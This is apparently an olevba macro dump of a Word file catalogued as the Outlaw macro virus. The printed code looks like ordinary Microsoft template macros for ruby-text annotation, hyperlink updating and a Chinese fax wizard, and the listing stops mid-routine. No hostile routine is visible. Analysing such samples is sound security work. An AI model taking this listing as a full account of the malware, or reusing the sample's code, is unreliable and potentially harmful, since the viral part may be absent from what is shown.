olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UC01.cls 
in file: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669 - OLE stream: 'Macros/VBA/UC01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Const SZ_MACRONAME = "並列文字"

Sub Insert()
    With Selection
        If Len(.Text) = 1 And .Text = (Chr$(13)) Then
            MsgBox "請先選取要並列的文字，再選取本功能選項。", _
                    Title:=SZ_MACRONAME
            GoTo LExit:
        End If
        If ((.Start = .End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        If (Right$(.Text, 1) = Chr$(13)) Then
            .End = .End - 1
        End If
        If (FIsRubyField(.Range) = False) Then
            If (.Range.Fields.Count > 0) Or (InStr(1, .Text, Chr$(13)) <> 0) _
                Or (InStr(1, .Text, vbTab) <> 0) Or (InStr(1, .Text, ",") <> 0) _
                Or (InStr(1, .Text, "(") <> 0) Or (InStr(1, .Text, vbTab) <> 0) Then
                MsgBox "無法為含有定位點、功能變數和段落符號的字串加入並列的註解", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        End If
        If (Selection.Start = Selection.End) Then
            MsgBox "請選取要加入註解的字串", Title:=SZ_MACRONAME
            GoTo LExit:
        End If
    End With
    InitDialog
    dlgRuby.Show
LExit:
End Sub

Sub Create(szRuby As String, szFont As String, iSize As Integer, iDist As Integer, szAlign As String)
    Dim rgn As Range
    Dim n As Integer
    Dim iCurSize As Integer
    Dim szCurFont As String
    Dim fnt As Font
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    On Error GoTo LError
    With Selection
        Set rgn = .Range
        Set fnt = GetCurFont(rgn)
        If (FIsRubyField(rgn) = True) Then
            Delete
        End If

        iCurSize = fnt.Size
        szCurFont = fnt.Name
        n = Len(.Text)
        
        ' Insert Field
        .Fields.Add .Range, , , False
        .TypeText "eq \o"
        
        ' Ruby string align
        Select Case (szAlign)
        Case "靠左"
            .TypeText "\al"
        Case "等間距展開"
            .TypeText "\ad"
        Case Else
        End Select
        
        .TypeText "(\s\up" + Str$(Int(iDist + .Font.Size - 1)) + "("
        .InsertBefore szRuby
        .Font.Size = iSize
        .Font.Name = szFont
        .Font.DisableCharacterSpaceGrid = False
        .MoveRight
        .InsertAfter "),"
        .Font.Size = iCurSize
        .Font.Name = szCurName
        .MoveRight , n + 2
        .TypeText ")"
        ' Kludge, To remove space char at end of field....
        .MoveLeft , 2
        .Delete unit:=wdCharacter, Count:=1
        
        .Fields.ToggleShowCodes
        .MoveRight , 1, 1
        
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim szCode As String
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        If (.Fields.Count < 1) Then GoTo LExit:
        For i = 1 To .Fields.Count
            szCode = rgn.Fields(i).Code
            Set rgnFld = rgn.Fields(i).Code
            If (FIsRubyField(rgn) = False) Then
                GoTo LExit:
            End If
            
            iTop = InStr(1, szCode, ",") + rgnFld.Start
            iEnd = rgnFld.End - 1
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            .MoveRight , Len(rgnFld.Text)
            .MoveRight , 1, 1
            .Delete
            rgnNew.Select
            
        Next i
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub InitDialog()
    Dim i As Integer
    Dim n As Integer
    Dim szFont As String
    Dim szCode As String
    Dim fnt As Font
    Dim fntRuby As Font
    
    On Error GoTo LError:
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait

    dlgRuby.IDCD_ALIGN.Clear
    dlgRuby.IDCD_ALIGN.AddItem "靠左"
    dlgRuby.IDCD_ALIGN.AddItem "置中"
    dlgRuby.IDCD_ALIGN.AddItem "等間距展開"
    
    With Selection
        Set fnt = GetCurFont(.Range)
        If (FIsRubyField(.Range) = True) Then
            dlgRuby.ID_RESET.Enabled = True
            ' Get Selected Field Values
            ' { eq \o\ad(\s\up 12(foo),bar) }
            Dim rgn As Range
            .Fields(1).Select
            Set rgn = .Fields(1).Code
            szCode = .Fields(1).Code.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                     ~~~
            iTop = InStr(11, szCode, "(")
            iEnd = InStr(1, szCode, ",") - 2
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            Set fntRuby = GetCurFont(rgn)
            dlgRuby.IDCT_FONT.Caption = fntRuby.NameFarEast
            dlgRuby.IDCT_SIZE.Caption = fntRuby.Size
            dlgRuby.IDCE_TEXT = rgn.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                  ~~
            iTop = InStr(1, szCode, "up ") + 2
            iEnd = InStr(11, szCode, "(")
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            dlgRuby.IDCE_DIST = Val(Mid$(szCode, iTop, iEnd - iTop)) - Int(fnt.Size) + 1
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '        ~~~
            If (InStr(1, szCode, "\al") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 0
            ElseIf (InStr(1, szCode, "\ad") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 2
            Else
                dlgRuby.IDCD_ALIGN.ListIndex = 1
            End If
        Else
            dlgRuby.ID_RESET.Enabled = False
            dlgRuby.IDCE_TEXT = ""
            dlgRuby.IDCE_DIST = Str$(0)
            dlgRuby.IDCT_SIZE.Caption = Int(fnt.Size / 2)
            dlgRuby.IDCT_FONT.Caption = fnt.NameFarEast
            dlgRuby.IDCD_ALIGN.ListIndex = 1
        End If
        dlgRuby.IDCE_TEXT.IMEMode = fmIMEModeNoControl
        dlgRuby.IDCE_TEXT.SetFocus
        dlgRuby.IDCE_TEXT.SelStart = 0
        dlgRuby.IDCE_TEXT.SelLength = 99
        If (dlgRuby.IDCE_TEXT.Text <> "") Then
            dlgRuby.IDOK.Enabled = True
        Else
            dlgRuby.IDOK.Enabled = False
        End If
    End With

    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Function FIsRubyField(rgn As Range) As Boolean
    FIsRubyField = False
    If (rgn.Fields.Count = 0) Then Exit Function
    A$ = rgn.Fields(1).Code.Text
    ' { eq \o\ad(\s\up 12(foo),bar) }
    '   ~~~~~   ~~~~~~ and "),\s\do" is only contained Kumimoji field
    If (Left$(A$, 6) = " eq \o") And (InStr(6, A$, "(\s\up") <> 0) And (InStr(9, A$, "),\s\do") = 0) _
        And (Right$(A$, 1) = ")") Then
        FIsRubyField = True
    End If
End Function


Function BuildRedirString$()

Dim RedirString$
Dim Arg$(0 To 11)
Dim OS As String

Select Case System.OperatingSystem
Case "Windows"
  OS = "Win"
Case "Windows NT"
  OS = "WinNT"
Case "Macintosh"
  OS = "Mac"
Case Else
  OS = "Win"
End Select

RedirString$ = "http://www.microsoft.com/isapi/redir.dll?"

Arg$(0) = "PRD=Word"
Arg$(1) = "&SBP=ia"
Arg$(2) = "&PLCID=" & Application.International(wdProductLanguageID)
Arg$(3) = "&PVER=" & Application.Version
Arg$(4) = "&OS=" & OS
Arg$(5) = "&OVER=" & System.Version
Arg$(6) = "&OLCID=" 'intentionally left blank
Arg$(7) = "&CLCID=" & "0x" & System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "Locale")
Arg$(8) = "&AR=templates"
Arg$(9) = "&O1="
Arg$(10) = "&O2="
Arg$(11) = "&O3="


For i = 0 To 11
  RedirString$ = RedirString$ & Arg$(i)
Next

BuildRedirString$ = RedirString$

End Function

Sub UpdateLink()
    Dim Anchor As Range
    For Each Hlink In ActiveDocument.Hyperlinks 'look at all hyperlinks in doc
        If Hlink.Address = "http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates" Then 'look for address to change
            If Hlink.Type = msoHyperlinkRange Then 'get Anchor - Text Or Shape
                Set Anchor = Hlink.Range        'text anchor
            Else
                Set Anchor = Hlink.Shape        'shape anchor
            End If
            Hlink.Delete            'delete old link
            ActiveDocument.Hyperlinks.Add Anchor, BuildRedirString()  'add new hlink in same place
        End If
    Next
End Sub

Option Explicit

'Standard Claimer

''******************************************************************************
'TO BE LOCALIZED
''******************************************************************************
'Style names
Public Const strSTY_RETURN_ADDR     As String = "Return Address"
Public Const strSTY_DOC_LABEL       As String = "Document Label"
Public Const strSTY_COMPANY_NAME    As String = "Company Name"
Public Const strSTY_MSG_HDR_FIRST   As String = "Message Header First"
Public Const strSTY_MSG_HDR_LABEL   As String = "Message Header Label"
Public Const strSTY_MSG_HDR_LAST    As String = "Message Header Last"

'misc strings
Public Const strPHONE   As String = "電話："
Public Const strFAX     As String = "傳真電話："
Public Const strPAGES   As String = "總頁數："
Public Const strTO      As String = "收件者："
Public Const strFROM    As String = "寄件者："
Public Const strDATE    As String = "日期："
Public Const strRE      As String = "主旨："
Public Const strCC      As String = "附本："

Public Const strCOMPANY         As String = "公司行號："
Public Const strFAX_NUMBER      As String = "傳真電話："
Public Const strPHONE_NUMBER    As String = "電話："
Public Const strTOTAL_NO_PAGES  As String = "包含封面在內總共頁數："

Public Const strEMPTY_MACRO As String = "EmptyMacro "
Public Const strNONE        As String = "<None>" 'choice to list of merge field
                                                 'names found in data source
                                'doc. if there is no field for last name.
                                'if the user selected this choice we don't
                                'insert a merge field for last name in the cover sheet.
Public Const strFLD_NAME As String = "Name" 'to select the field containing recipient name
                                    'from the fields present in the data source
Public Const strFLD_FAX As String = "Fax" 'to select the merge field containing fax number

Public Const strCLICK_HERE_NAME     As String = "[按一下這裡輸入姓名]"
Public Const strCLICK_HERE_PAGES    As String = "[按一下這裡輸入傳真頁數]"
Public Const strCLICK_HERE_SUBJECT  As String = "[按一下這裡輸入傳真主旨]"
Public Const strCLICK_HERE_COMMENTS As String = "[按一下這裡輸入必要的註記]"
Public Const strCLICK_HERE_COMPANY  As String = "[按一下這裡輸入公司名稱]"
Public Const strCLICK_HERE_PHONE_NUMBER As String = "[按一下這裡輸入電話]"
Public Const strCLICK_HERE_FAX_NUMBER As String = "[按一下這裡輸入傳真電話]"

'Address format to get info. from the Address book. Please be careful about the commas and
'spaces since you might end up with a space at the beginning of a name if not put at the right place.
'Please change the names only if you know the correct one.
Public Const strADDR_BK_NAME_FORMAT As String = "{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}"
Public Const strADDR_BK_ADDR_FORMAT As String = "{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>" & vbCr & "}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}"
Public Const strADDR_BK_FAXNUM_FORMAT As String = "{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}"
Public Const strADDR_BK_PHONE_FORMAT As String = "{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}"
Public Const strADDR_BK_COMPANY_FORMAT As String = "{<PR_COMPANY_NAME>}"

'status messages put up while faxing the cover sheet and document. For some messages
'I add "..." and so add "..." to all strings.
Public Const strFAXING_DOC_RECIPIENTS As String = "正在傳真這份文件給所有收件者..."
Public Const strFAXING_DOC_RECIPIENT As String = "正在傳真這份文件給收件者"
Public Const strFAXING_CS_RECIPIENTS As String = "正在傳真封面給所有收件者..."
Public Const strFAXING_CS_RECIPIENT As String = "正在傳真封面給所有收件者"
Public Const strFAXING_CS_TO As String = "正在傳真封面到"
Public Const strFAXING_DOC_TO As String = "正在傳真文件到"

'the text in the last panel
'the first one is the default. The next string is used if the user selects no cover sheet, when
'we actually send the fax on clicking Finish
Public Const strLAST_PANEL_DFLT_TEXT As String = "如果執行精靈有問題的話，請重新執行傳真精靈，檢查輸入傳真電話的格式是否正確。例如，您是不是忘了貴公司的電話系統在撥外線前，需先按個鍵，比如說數字鍵「9」。要記得加進傳真電話中喔！"
Public Const strLAST_PANEL_NOCOVSHT_TEXT As String = "所有資料已輸入完畢，按一下完成鍵，精靈將送出您的傳真文件！"

'strings necessary to display help in case of failure of Fax
Public Const strHLP_FAX_INSTALL As String = "如果您現在執行的是 Windows 95，現在您就可以安裝本精靈了。按下確定鍵，螢幕上將會出現輔助說明文件，告訴您如何安裝精靈！"
'the next string is the title as it appears on Word's main window
Public Const strMS_WORD As String = "Microsoft Word"

'make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off
'when the command bar is displayed.
Public Const strCMD_BAR_TITLE   As String = "中文傳真精靈"
Public Const strCMD_BTN_TEXT    As String = "現在送出傳真"

Public Const strCURRENT_DOC     As String = "目前的文件("
Public Const strRIGHT_PAREN     As String = ")"

'Window caption of the cover sheet (the document's name will follow if the user is faxing a document)
Public Const strWINDOW_CAPTION  As String = "的傳真封面表單"
'Window caption if user is not faxing a doc. and just created a cover sheet.
Public Const strCOVER_SHEET_CAPTION As String = " - 傳真封面表單"

'Text in merge fields inserted in the cover sheet
Public Const strFLD_FAX_NAME    As String = "Name"
Public Const strFLD_FAX_NUMBER  As String = "FaxNumber"

'In NT3.51, the printer name from the print set up dialog which is called when the user clicks on
'Other... , returns the printer name with the printer location after ON
'so if a printer name is \\abcd\efg with location "location1" then the printer
'name is returned a "\\abcd\efg ON location1. So we have to strip out the text
'after ON. That's what this constant is for. In other countries too is this text
'going to be ON?
Public Const strPRINTER_ON      As String = " ON "

Public Const iMAX_ADDR_LINES = 3 'max. # of lines address can have
'Error messages
Public Const strERR_MAX_ADDR_LINES  As String = "地址不可超過三行。"
Public Const strERR_NO_DATA_SRC     As String = "精靈找不到要傳真的文件。"
Public Const strERR_CREATING_CMDBAR As String = "精靈無法建立「Send Fax」工具列。 請重新執行傳真精靈。"
Public Const strERR_NO_MAIN_DOC1     As String = "要建立封面表單的文件 ("
Public Const strERR_NO_MAIN_DOC2     As String = ") 未開啟。請先開啟該文件，然後重新執行精靈！"
Public Const strERR_DISPLAY_QUERY_OPTIONS As String = "精靈找不到要加入的資料。"
Public Const strERR_CHOOSING_DOC As String = "精靈無法選取要用來傳真的文件。"
Public Const strERR_RCPNTS_NOT_CHOSEN As String = "精靈需要知道這份的收件者是誰。請按下「確定」鈕，然後選取傳真的收件者。"

'this tip is displayed in an Autodown balloon finally
Public Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = "請輸入其它您想寫在封面表單上的資料，然後按下在 " & strCMD_BAR_TITLE & " 工句列上的「" & strCMD_BTN_TEXT & "」鈕。 "
'this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients
Public Const strPOST_WIZARD_TIP_MRG_FLD As String = "請輸入其它您想寫在封面表單上的資料，然後按下在 " & strCMD_BAR_TITLE & " 工句列上的「" & strCMD_BTN_TEXT & "」鈕。 " & "但請不要刪除在「<< >>」符號中的欄位；稍後傳真精靈將利用他們來傳真您指定的文件到收件者手上。"

'this message is put up after we successfully faxed everything
Public Const strMSG_FAX_SUCCESS As String = "精靈已將您的文件送出去了。"

'the 72 factor in the below 2 measurements is conversion factor of inches to points
'contemporary styles have a left indent of 0.56"
Public Const sCONT_LEFT_INDENT As Single = 0.56 * 72
'While converting text to table, for the Contemporary style alone,
'I need to set the first column's width explicitly. For English text,
'0.5" is big enough. If the text in the first column is getting truncated
'in your language, then please increase this value.
Public Const sCONT_WIDTH_COL1 As Single = 2.36 * 72

'The date format need not be localized if VB does not require it.
'Medium date is of the format "02-Apr-94". If the standard date format
'is anything different in the country, then please change it.
'important to have MMMM and not mmmm, since mm refers to minutes in a time field
Public Const strDATE_FORMAT As String = "MMMM d, yyyy"

''******************************************************************************
'DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS
''******************************************************************************
'the following are the names of the autotext entries in the wizard.
'DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD.
'if you change them, then please change the following strings too, correspondingly
Public Const strAT_UNCHKD_BOX   As String = "Unchecked Box"
Public Const strAT_CHKD_BOX     As String = "Checked Box"
Public Const strCNTMPGFX2        As String = "cntmpgfx2"
Public Const strPOST_WIZ_BLN    As String = "Fax Post Wizard Balloon"

Public Const sA4_LEFT_MARGIN    As Single = 82.08
Public Const sA4_RIGHT_MARGIN    As Single = 81.36
Public Const sLETTER_MARGIN     As Single = 90
'key where setup writes company name
Public Const strREGKEY_CMPNY_NAME As String = "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
Public Const strVALKEY_CMPNY_NAME As String = "DefCompany"

Public fDocChanged As Boolean 'set if user changes the doc. to be faxed

Public objMainDoc As Document 'main doc which has to be sent
Public objDataSrc As MailMergeDataSource ' main doc's data src

'SQL query used to select all names from the data source
Public Const strSELECT_QUERY As String = "Select * From "

'form and callback balloon constants
Public Const iMAX_PANEL As Integer = 6 'panel # of the last panel in
                             'the dialog (starts from 0)
Public rgstrAssistantMsg(iMAX_PANEL) As String   ' as many as there are states

Public strBULLET     As String
Public strSOFT_ENTER As String
Public rgstrNotes(3) As String
Public strQUOTE As String
'available styles
Public Const iSTY_PROFESSIONAL  As Integer = 0
Public Const iSTY_CONTEMPORARY  As Integer = 1
Public Const iSTY_ELEGANT       As Integer = 2

'array for holding long and short template names
Public rgstrTemplateFileNames(3, 3) As String
Public Const iLONG_NAME As Integer = 0
Public Const iSHORT_NAME As Integer = 1

Public iFaxStyle As Integer 'stores the fax style chosen
Public fStylesCopied As Boolean

Public fMSFAXEnabled As Boolean 'disabled in NT

'Panel numbers
Public Const iPANEL_RCPNTS As Integer = 3
Public Const iPANEL_SENDER As Integer = 5
Public Const iPANEL_STYLE  As Integer = 4

'Max. number of recipients
Public Const iMAX_RCPNTS As Integer = 5

Public fDocIsFormLtr As Boolean 'true if doc. is a form letter
'to store the data options query that the user selects for the form letter
Public strFormLetterSQL As String
Public strFormLetterSQL1 As String
Public strConnectString As String
Public fDocPresent   As Boolean 'true if there is an main doc. apart
                                'from the doc created by FileNew
'keeps track of which panel to be skipped.
'if we are enabling a panel, then we need to restore the shape's
'color to as it was before. rgiColorShape stores that color
Public rgfSkipPanel(iMAX_PANEL) As Boolean 'if rgfSkipPanel(i) is True,
                                            'then skip the ith panel
Public rgiColorShape(iMAX_PANEL) As Long
Public fCheckValidity As Boolean
Public fNoCovSht As Boolean 'False if user selects "No cover sheet"

Public iFaxOption       As Integer 'Fax program selected by the user
Public Const iMS_FAX    As Integer = 0  'Microsoft Fax
Public Const iDIFF_FAX  As Integer = 1  'Other than MS Fax
Public Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet

Public fRegistryNamesRead As Boolean 'true if MRU list has been read from reg.

Dim rgstrFaxTitle(3)        As String
Dim rgstrChkBoxText(5)      As String 'text beside the check boxes
Public strAsstMsgRcpntsFormLtr As String 'assistant help for form letter recipients' panel
Public strAsstMsgRcpntsOrdDoc As String 'assistant help for ordinary doc. recipients' panel

'tip displayed in an autodown balloon after the wizard is done
Public fCreatedCmdBar           As Boolean 'tip is to be displayed only if cmd bar created

'arrays to get the MRU list of recipient names and numbers stored in the registry
Dim rgstrMRUFaxNames(iMAX_RCPNTS) As String
Dim rgstrMRUFaxNums(iMAX_RCPNTS)  As String

'arrays to get the recipients names and numbers that the user entered
Dim rgstrRcpntFaxNames(iMAX_RCPNTS) As String
Dim rgstrRcpntFaxNums(iMAX_RCPNTS)  As String
Public iNumRcpnts As Integer

'DO NOT LOCALIZE - CONTROL NAMES
Public Const strCBO_RCPNT_NAME  As String = "cboRcpntName"
Public Const strCBO_RCPNT_NUM   As String = "cboRcpntNum"
Public iCboRcpntNameFocus       As Integer

'DO NOT LOCALIZE - REGISTRY ENTRIES
Public Const strRCPNT_NAME      As String = "Name of recipient#"
Public Const strRCPNT_NUMBER    As String = "Number of recipient#"
Public Const strNUM_RCPNTS      As String = "Number of recipients"

'Help files
Public Const strWIN_HELP_FILE As String = "Windows.hlp"
Public Const strFAX_HELP_FILE As String = "awfax.hlp"

'contexts for the help
Public Const lCNTXT_FAX_INSTALL As Long = 461903903
Public Const lCNTXT_FAX_SEND As Long = 1698757633
Public Const HELP_COMMAND As Integer = 258 'hex value = 0x0102

'error number that word returns on fax not being installed
Public Const iERR_FAX_NOT_INSTALLED As Integer = 5663
Public Const iERR_FAX_NOT_SENT As Integer = 4559

'DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS
Declare Function RegEnumKey Lib "advapi32.dll" Alias "RegEnumKeyA" _
(ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, ByVal cbName As Long) As Long

Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Declare Function GetWindowsDirectory Lib "Kernel32" Alias "GetWindowsDirectoryA" (ByVal strDir As String, ByVal uSize As Integer) _
As Integer

Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal strWndClassName As String, _
ByVal strWndName As String) As Long

Declare Function WinHelp Lib "USER32" Alias "WinHelpA" (ByVal hwnd As Long, ByVal strFileName As String, _
ByVal wCmd As Integer, ByVal dwData As Any) As Integer


Public rgstrPrinterNames()  As String
Public iTotalNumPrinters    As Integer

Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Const KEY_ALL_ACCESS As Long = &HF0063
Const ERROR_SUCCESS As Long = 0
Const ERROR_NO_MORE_ITEMS As Long = 259

'registry keys under which printer names are found
Const strREG_PROVIDERS As String = "System\CurrentControlSet\Control\Print\Providers\"
Const strREG_LOCAL_PRINTERS As String = "System\CurrentControlSet\Control\Print\Printers\"

'initialise the vars. whiehc refer to the wizard's name
Public Sub InitWizardName(fDummy As Boolean)
    
    strWizName = "中文傳真精靈"
    strWizLongName = "中文傳真精靈"
    strWizShortName = "CFax1"

End Sub

'initialize strings specific to this wizard
Private Sub InitWizardStrings()
Dim i As Integer
    
    'fax title for the different styles
    rgstrFaxTitle(iSTY_CONTEMPORARY) = "傳真信件"
    rgstrFaxTitle(iSTY_ELEGANT) = "傳真信件表單"
    rgstrFaxTitle(iSTY_PROFESSIONAL) = "傳真"
    
    'text appearing after the unchecked boxes
    rgstrChkBoxText(1) = "急件"
    rgstrChkBoxText(2) = "請查閱"
    rgstrChkBoxText(3) = "請批示"
    rgstrChkBoxText(4) = "請回覆"
    rgstrChkBoxText(5) = "請傳閱"
    
    'Assistant messages
    rgstrAssistantMsg(0) = "使用傳真精靈，您可以傳真電子郵件，將信件合併到傳真文件中一起傳真， 或從傳真機中印出一張封面表單。"
    rgstrAssistantMsg(1) = "如果您想要傳真其它文件，請先開啟您想要傳真的文件，然後再執行傳真精靈。"
    rgstrAssistantMsg(2) = "如果您的作業系統是 Windows NT，則您無法使用 Microsoft 傳真，但是您還是可以使用其它已安裝在系統中的傳真軟體來為您傳真。如果您的系統不支援傳真功能的話，沒關係，您可以先將文件列印出來，然後再利用傳真機將文件傳真出去。"
    rgstrAssistantMsg(iPANEL_RCPNTS) = "如果您曾用過傳真精靈，則下拉式清單方塊中會列出您最近傳真過的文件名稱。 您可以在清單中選取傳真過的文件，將其附在您的封面表單之後一起傳真出去。"
    rgstrAssistantMsg(iPANEL_SENDER) = "請輸入您想寫在封面表單上有關送件者的資料。"
    rgstrAssistantMsg(iPANEL_STYLE) = "請選取您封面表單所要的格式。在傳真之前，您還是可以改變封面表單的外觀，或是加入必要的註記。"
    rgstrAssistantMsg(iMAX_PANEL) = "要修改任何設定，請按「上一步」。"
    'if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too.
    strAsstMsgRcpntsFormLtr = "請點取「姓名」欄位，再來請點取「傳真電話」欄位， 然後從通訊錄中選取要加入的收件人或其傳真電話。 您可以選擇傳真給每一個人或是指定只傳真給某人。"
    strAsstMsgRcpntsOrdDoc = "如果您曾用過傳真精靈，那麼「姓名」欄位的下拉式清單方塊中會有最近傳真對象的名字。您可以從中選取收件者姓名插入封面表單中。"
    

    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iLONG_NAME) = "專業式傳真.dot"
    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iSHORT_NAME) = "cPrfax.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iLONG_NAME) = "現代式傳真.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iSHORT_NAME) = "cCofax.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iLONG_NAME) = "典雅式傳真.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iSHORT_NAME) = "cElfax.dot"
    
    rgstrNotes(iSTY_PROFESSIONAL) = "註解："
    rgstrNotes(iSTY_CONTEMPORARY) = "註解："
    rgstrNotes(iSTY_ELEGANT) = "註解："
    
    ''**********************************************************************
    'DO NOT LOCALIZE BEYOND THIS POINT.
    ''******************************************************************************
    
    'initialize arrays with the color of the subway shapes for the panels
    For i = 0 To iMAX_PANEL
        rgfSkipPanel(i) = False
        rgiColorShape(i) = COLOR_LIGHTGREY
    Next i

    strBULLET = "�""
    strSOFT_ENTER = Chr$(11)
    strQUOTE = Chr$(34)
                                        
    'DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET
    'OF DIALOG VALUES IN THE REGISTRY.
    strRegSettingsKey = strREG_SETTINGS_BASE_KEY & "Fax Wizard"
End Sub

'initialises the form
Private Sub InitForm()
    On Error GoTo FatalError
    
    Set formWizard = New formWizDlg
    If formWizard Is Nothing Then
        DisplayErrorMsg strERR_INIT_FORM
        ReportError Err
    End If

    iCurrentPanel = 0
    formWizard.lblWizardName1.Caption = " " & strWizLongName & " "
    Exit Sub

FatalError:
    DisplayErrorMsg strERR_INIT_FORM
    ReportError Err
    
End Sub

Sub InitWizard(fDummy As Boolean)
    
    InitForm
    InitWizardStrings

    fNoCovSht = False
    fStylesCopied = False
End Sub

Public Sub SetMainDoc(fDummy As Boolean)
Dim cDocs As Integer
Dim i As Integer

    On Error GoTo FatalError
    
    fDocIsFormLtr = False
    fDocPresent = False
    fDocChanged = False
    cDocs = Application.Documents.Count
    
    If cDocs > 1 Then
    'we don't want to add the doc. that was just created thro' FileNew
        For i = 2 To cDocs
            formWizard.cboDocList.AddItem Documents(i).Name
        Next i

        formWizard.cboDocList.ListIndex = 0
        fDocPresent = True
    Else
        'just one doc. i.e the freshly created one
        Set objMainDoc = Nothing
    End If
    Exit Sub

FatalError:
    ReportError Err

End Sub

'checks the kind of document and sets fDocIsFormLtr
Public Sub CheckDocKind(objDoc As Document)
Dim objMM As MailMerge
Dim strQueryString As String
    On Error GoTo LReturn
    fDocIsFormLtr = False
    Set objMM = objMainDoc.MailMerge
    Set objDataSrc = objMM.DataSource
    If objDataSrc.Type = wdNoMergeInfo Then GoTo LReturn
    strQueryString = objDataSrc.QueryString
    strFormLetterSQL = Left$(strQueryString, 255)
    strFormLetterSQL1 = Mid$(strQueryString, 256)
    strConnectString = objDataSrc.ConnectString
    fDocIsFormLtr = True
    
    Exit Sub
LReturn:
    Err.Clear
    fDocIsFormLtr = False
End Sub

Public Sub CreateCoverSheet(fDummy As Boolean)
Dim strDocName As String
Dim objFps As PageSetup

    On Error GoTo FatalError
    Application.StatusBar = strCREATING_DOC
    Application.ScreenUpdating = False
    
    System.Cursor = wdCursorWait

    If fChangeToA4 Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sA4_LEFT_MARGIN
        objFps.RightMargin = sA4_RIGHT_MARGIN
    ElseIf fChangeToLetter Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sLETTER_MARGIN
        objFps.RightMargin = sLETTER_MARGIN
    End If
    
    If (((Not (fDocIsFormLtr)) And (iNumRcpnts > 1)) Or fDocIsFormLtr) Then _
        CreateDataSource
        
    StatusBar = strCREATING_DOC
    Select Case iFaxStyle
    Case iSTY_PROFESSIONAL
        CreateProfContCoverSheet
    Case iSTY_CONTEMPORARY
        CreateProfContCoverSheet
    Case iSTY_ELEGANT
        CreateElegCoverSheet
    End Select
    
    If (fDocPresent) And (Not (formWizard.optCovSht.Value)) Then
        strDocName = ActiveWindow.Caption & " - " & objMainDoc.Name & strWINDOW_CAPTION
    Else
        strDocName = ActiveWindow.Caption & strCOVER_SHEET_CAPTION
    End If
        
    With ActiveWindow
        .Caption = strDocName

        .View.TableGridlines = False
    End With
    ActiveDocument.UndoClear
